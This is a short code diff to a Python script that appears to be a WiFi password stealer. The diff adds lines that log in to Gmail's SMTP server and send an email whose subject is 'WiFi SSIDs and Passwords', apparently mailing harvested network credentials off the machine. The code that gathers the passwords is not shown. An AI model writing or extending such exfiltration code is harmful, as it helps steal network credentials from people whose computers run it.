@@ -33,4 +33,12 @@ email = EmailMessage()
 email["from"] = "name_of_sender"
 email["to"] = "email_address"
 email["subject"] = "WiFi SSIDs and Passwords"
-email.set_content(email_message)   
+email.set_content(email_message)
+
+
+# Create smtp server
+with smtplib.SMTP(host="smtp.gmail.com", port=587) as smtp:
+    smtp.ehlo()
+    smtp.starttls()
+    smtp.login("login_name", "password")
+    smtp.send_message(email)
